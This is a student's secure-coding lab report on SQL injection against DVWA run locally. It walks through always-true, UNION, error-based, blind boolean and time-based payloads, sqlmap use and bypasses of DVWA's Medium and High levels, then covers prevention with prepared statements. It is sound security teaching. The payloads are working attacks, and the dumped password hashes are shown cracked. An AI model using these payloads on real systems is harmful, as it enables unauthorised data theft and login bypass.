# WEB404 Secure Coding Practices: Practical Assignment 2
## SQL Injection: Attacking and Defending a Vulnerable Web Application

**Student ID:** 02230302
**Module:** WEB404, Secure Coding Practices
**Target application:** DVWA (Damn Vulnerable Web Application)
**Environment:** Local only, bound to `127.0.0.1` (Docker)

---

## Overview: what this assignment does and how

This assignment attacks and then defends a web application against **SQL
Injection (SQLi)**.

The approach has four stages:

1. **Set up a vulnerable target**: DVWA running locally in Docker, bound to
   `127.0.0.1`.
2. **Attack it**: demonstrate five types of SQL injection (in-band always-true,
   UNION-based, error-based, blind boolean-based, blind time-based), plus the
   automated tool `sqlmap`.
3. **Compare security levels**: show how DVWA's Low/Medium/High defences change
   the attack but never fix the root cause, and how "Impossible" finally does.
4. **Prevent it**: fix the flaw with parameterized queries (prepared
   statements) and show the same attack failing, backed by a defence-in-depth
   checklist.

The single root cause throughout: **user input concatenated directly into a SQL
query.**

---

## 1. Introduction

### What is SQL Injection?
**SQL Injection (SQLi)** is a vulnerability that occurs when an application builds a
database query by **mixing untrusted user input directly into the SQL text**. Because
the input and the SQL commands travel in the same string, a crafted input can change
the **meaning** of the query, so the database can no longer tell the developer's
instructions apart from the attacker's data.

A single input box expecting a number like `1` can be turned into a command that
returns every user, dumps password hashes, or pauses the server on command.

### Why is it dangerous?
- **Confidentiality:** attackers can read any data the database account can see
  (usernames, password hashes, personal data).
- **Integrity:** data can be modified or deleted (`UPDATE`, `DELETE`, `DROP`).
- **Authentication bypass:** login checks can be fooled into granting access without
  a valid password.
- **Full compromise:** in some configurations it leads to command execution on the
  server.

### OWASP reference
SQL Injection belongs to **A03:2021, Injection** in the
[OWASP Top 10 (2021)](https://owasp.org/Top10/A03_2021-Injection/). Injection has been
a top-ranked web risk for over a decade precisely because the root cause, trusting
user input inside a command, is so easy to introduce.

---

## 2. Lab Setup and Ethical Considerations

### Tools
| Tool | Purpose |
|------|---------|
| Docker + docker-compose | Run DVWA in an isolated container |
| DVWA (`vulnerables/web-dvwa`) | The intentionally vulnerable target |
| `curl` | Send crafted requests; clean terminal evidence |
| `sqlmap` | Automated SQLi tool (demonstration) |
| Docker `php:8.3-cli` | Run the standalone prevention demo |

### How to run the lab
```bash
docker compose up -d          # start DVWA on http://127.0.0.1:4280
```
Then in the browser:
1. Open **http://127.0.0.1:4280** and log in with `admin` / `password`.
2. Click **Create / Reset Database** (builds the `users` table).
3. Set **DVWA Security** to the level being tested (Low, Medium, High).

> [SCREENSHOT: DVWA home page, logged in, security level = Low, `screenshots/01-dvwa-setup-low.png`]

### Ethical considerations
- **Everything runs locally.** In `docker-compose.yml` the port is published as
  `127.0.0.1:4280:80`. Binding to the **loopback address** means the vulnerable app is
  reachable **only from this laptop**, never from the local network or the internet.
- **The target is a purpose-built practice app** (DVWA), used with permission by design.
- **No external system is ever touched.** SQL injection against a system you do not own
  or have written authorization to test is illegal and unethical. This lab exists to
  learn how the attacks work *so they can be prevented*.

---

## 3. SQL Injection Attacks (Low Security)

DVWA's **SQL Injection** page has one input, "User ID". At Low security the code
(`dvwa_source/sqli_low.php`) builds the query like this:

```php
$id = $_REQUEST[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

The input `$id` is dropped **between single quotes with no checking**, the single flaw
behind every attack below. Normal use (`id = 1`) returns one user's name.

---

### 3.1 In-band: Always-true / Authentication bypass

**Payload**
```
' OR '1'='1
```
**Resulting query**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1';
```
**Why it works (one line):** the `'` closes the intended string early and `OR '1'='1'`
adds a condition that is **always true**, so the `WHERE` matches **every row**.

**What it returned:** all 5 users (admin, Gordon Brown, Hack Me, Pablo Picasso,
Bob Smith). "In-band" means the stolen data returns through the normal page response.

> [SCREENSHOT: `' OR '1'='1` returning all users, `screenshots/02-inband-always-true.png`]

---

### 3.2 UNION-based: Extract data from other tables

A `UNION` appends a second `SELECT`; both must return the **same number of columns**.

**Step A, find the column count**
```
' ORDER BY 1 #     → ok
' ORDER BY 2 #     → ok
' ORDER BY 3 #     → ERROR  ⇒ the query has 2 columns
```
**Step B, extract usernames + password hashes**
```
' UNION SELECT user, password FROM users #
```
**Why it works (one line):** the first `SELECT` matches nothing (`user_id = ''`), so the
page displays purely the second `SELECT`, the credentials table.

**What it returned:**
```
admin   : 5f4dcc3b5aa765d61d8327deb882cf99
gordonb : e99a18c428cb38d5f260853678922e03
1337    : 8d3533d75ae2c3966d7e0d4fcc69216b
pablo   : 0d107d09f5bbe40cade3de5c71e9e9b7
smithy  : 5f4dcc3b5aa765d61d8327deb882cf99
```
These are **unsalted MD5** hashes (e.g. `5f4dcc3b…` = the word `password`), so they are
trivially cracked (see §6). Schema discovery via `information_schema` is also possible:
```
' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database() #
```

> [SCREENSHOT: UNION dump of usernames and hashes, `screenshots/03-union-password-hashes.png`]

---

### 3.3 Error-based: Make the database leak via an error message

At Low security DVWA prints the raw database error (`or die(mysqli_error())`). The attack
feeds a function that fails on purpose but carries the injected data in the error text.

**Payload**
```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE user_id=1))) #
```
**Why it works (one line):** `extractvalue()` expects valid XPath; `0x7e` (`~`) makes it
invalid, so MySQL aborts and **quotes the injected data back inside the error message**.

**What it returned:**
```
XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf99'
```
(Note: `extractvalue` prints ~32 characters, so longer values need `substring()`.)

> [SCREENSHOT: XPATH error leaking the admin hash, `screenshots/04-error-based-extractvalue.png`]

---

### 3.4 Blind boolean-based: Infer data from TRUE/FALSE page differences

On the **SQL Injection (Blind)** page, results and errors are hidden. The page only ever
says **"User ID exists"** (true) or **"User ID is MISSING"** (false), a 1-bit oracle.

**Confirm the oracle**
```
1' AND '1'='1     → exists  (TRUE)
1' AND '1'='2     → missing (FALSE)
```
**Extract data one character at a time**
```
1' AND length(database())=4 #                      → exists  (name is 4 chars)
1' AND substring(database(),1,1)='d' #             → exists  (1st char = d)
1' AND substring((SELECT password FROM users WHERE user_id=1),1,1)='5' #   → exists
```
**Why it works (one line):** the data is not visible, but the page's **behaviour** is made
to depend on it; chaining enough yes/no questions reconstructs any value character by
character.

> [SCREENSHOT: blind boolean TRUE ("exists"), `screenshots/05a-blind-bool-true.png`]
> [SCREENSHOT: blind boolean FALSE ("missing"), `screenshots/05b-blind-bool-false.png`]

---

### 3.5 Blind time-based: Infer data from a response delay

When even the text is identical, **time** becomes the oracle: delay only if a condition
is true.

**Payloads**
```
1' AND IF(1=1, SLEEP(3), 0) #    → ~3s delay (TRUE)
1' AND IF(1=2, SLEEP(3), 0) #    → instant   (FALSE)
1' AND IF(substring(database(),1,1)='d', SLEEP(3), 0) #   → ~3s ⇒ 1st char is 'd'
```
**Why it works (one line):** `IF(condition, SLEEP(3), 0)` only sleeps when the condition
is true, so the **response time itself** leaks the answer.

**Measured result** (from `tools/sqli_time_test.sh`):
```
FALSE condition : 0.017s
TRUE  condition : 3.016s
1st char = 'd'? : 3.014s   (TRUE)
1st char = 'x'? : 0.006s   (FALSE)
```

> [SCREENSHOT: terminal timing, FALSE instant vs TRUE ~3s, `screenshots/06-blind-time-based.png`]

---

## 4. Security Levels Compared (Low / Medium / High / Impossible)

The key insight: at Medium and High, DVWA adds **partial defences** but never fixes the
real bug (the query is still built by concatenating strings). Only "Impossible" fixes it.

| Level | Defence added | Why it still fails | Attack used |
|-------|--------------|--------------------|-------------|
| **Low** | none | query is `'$id'`, raw | `' OR '1'='1` |
| **Medium** | dropdown (client-side) + `mysqli_real_escape_string()`; id used **unquoted** | escaping only neutralises quotes, but an unquoted numeric context needs none; the dropdown is client-side only (bypassed with `curl`) | `1 UNION SELECT user, password FROM users #` |
| **High** | input on a **separate page** (session) + `LIMIT 1` | query is still `'$id'`; `#` comments out `LIMIT 1`; separate page only hampers automated tools | `' UNION SELECT user, password FROM users #` |
| **Impossible** | **prepared statement** (PDO `bindParam`, `PARAM_INT`) + `is_numeric()` + anti-CSRF token | input can never become SQL code | **attack fails** |

Both Medium and High still leaked all five password hashes (see
`tools/sqli_levels_demo.sh`).

**Viva note, Medium hex trick:** if an attack at Medium needs a string literal (which
`mysqli_real_escape_string` would escape), write it as hex instead, e.g. `0x7573657273`
= `users`, avoiding quotes entirely.

> [SCREENSHOT: terminal output of `sqli_levels_demo.sh`, both levels leak hashes, `screenshots/07-medium-high-bypass.png`]
> [SCREENSHOT (optional): High popup "Click here to change your ID" with UNION payload, `screenshots/07b-high-browser.png`]

### 4.1 Automated attack with sqlmap (demonstration)
`sqlmap` is the industry-standard automated SQLi tool. Pointed at the Low page with the
session cookie (`tools/sqlmap_demo.sh`), it:
1. sent ~182 probes and found `id` injectable;
2. automatically confirmed **the same four techniques** demonstrated by hand
   (boolean-blind, error-based, time-based, UNION);
3. fingerprinted the stack (MariaDB / Apache 2.4 / Debian);
4. dumped the `users` table and **cracked the unsalted MD5 hashes** with its wordlist:

```
admin : password      gordonb : abc123     1337 : charley
pablo : letmein        smithy  : password
```

> [SCREENSHOT: sqlmap detecting the 4 injection types, `screenshots/08a-sqlmap-detect.png`]
> [SCREENSHOT: sqlmap dumped + cracked users table, `screenshots/08b-sqlmap-dump.png`]

---

## 5. Prevention

### 5.1 DVWA's own code: vulnerable vs secure
**Vulnerable (`dvwa_source/sqli_low.php`)**, input concatenated into SQL:
```php
$id = $_REQUEST[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

**Secure (`dvwa_source/sqli_impossible.php`)**, a parameterized query:
```php
if (is_numeric($id)) {                                 // 1. validate input type
    $data = $db->prepare(
        'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
    $data->bindParam(':id', $id, PDO::PARAM_INT);      // 2. input bound as DATA
    $data->execute();
}
```
**The difference:** in the secure version the SQL text is fixed and contains only a
**placeholder** `:id`. The input is attached afterwards as a typed value, so it can never
be parsed as SQL. (It also validates with `is_numeric` and adds an anti-CSRF token.)

### 5.2 Standalone demonstration (this folder)
`prevention/vulnerable.php` and `prevention/secure.php` implement the **same** login
check, one with string concatenation, one with a prepared statement. Run both with:
```bash
bash tools/prevention_demo.sh
```

| Input | `vulnerable.php` | `secure.php` |
|-------|------------------|--------------|
| `admin` / `s3cr3t` (correct) | GRANTED | GRANTED |
| `admin' --` / wrong password | **GRANTED (bypassed)** | **DENIED** |
| `' OR '1'='1' --` / anything | **GRANTED (bypassed)** | **DENIED** |

The vulnerable query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'wrongpass'
```
`--` comments out the password check. In `secure.php` the identical input is bound as
data (`username=[admin' --]`), matches no user, and is denied.

> [SCREENSHOT: `prevention_demo.sh` output, GRANTED on vulnerable, DENIED on secure, `screenshots/09-prevention-demo.png`]

### 5.3 Defence-in-depth checklist
1. **Parameterized queries / prepared statements** *(primary fix)*: separate code from
   data so input can never alter query structure. Use these everywhere; avoid building
   SQL by string concatenation.
2. **Least-privilege database account**: the app should connect with an account that can
   only do what it needs (e.g. `SELECT`/`INSERT` on specific tables, never `DROP` or
   access to other databases). Limits the blast radius if injection still occurs.
3. **Input validation / allow-listing**: reject input that doesn't fit the expected type
   or format (e.g. a user ID must be an integer). A secondary layer, not a replacement
   for parameterization.
4. **Safe error handling**: never show raw database errors to users (kills error-based
   SQLi and avoids leaking schema).
5. **Proper password storage**: hash with a slow, salted algorithm (bcrypt/Argon2), not
   unsalted MD5, so a leaked table is not instantly cracked.
6. **Web Application Firewall (WAF)**: filters common injection patterns at the network
   edge. Useful defence-in-depth, but **not** a substitute for fixing the code (filters
   can be bypassed, e.g. with encoding).

---

## 6. Conclusion

This lab set up DVWA locally and demonstrated five types of SQL injection, in-band
always-true, UNION-based, error-based, blind boolean-based, and blind time-based, all
rooted in a single flaw: **user input concatenated directly into a SQL query**. Raising
DVWA's security level showed that partial defences (input escaping, client-side
dropdowns, `LIMIT 1`, hiding the input field) **change the attack but do not stop it**,
because they never address that root cause. `sqlmap` showed how routine the whole process
becomes once a parameter is injectable.

The fix is decisive and simple: **parameterized queries** separate SQL code from user
data, so input can only ever be a value, demonstrated by the `secure.php` example, where
the identical attack that bypassed `vulnerable.php` is denied. Combined with
least-privilege database accounts, input validation, safe error handling, strong password
hashing, and a WAF for defence-in-depth, SQL injection is a thoroughly solved problem in
code that is written correctly.

---

## Appendix: Repository contents
```
docker-compose.yml          DVWA on 127.0.0.1:4280
dvwa_source/                DVWA's SQLi source (low/medium/high/impossible)
prevention/vulnerable.php   insecure login (string concatenation)
prevention/secure.php       secure login (prepared statement)
tools/sqli_time_test.sh     blind time-based demo (curl)
tools/sqli_levels_demo.sh   medium/high bypass demo (curl)
tools/sqlmap_demo.sh        automated attack with sqlmap
tools/prevention_demo.sh    vulnerable vs secure demo (Docker PHP)
screenshots/                evidence (see checklist)
```
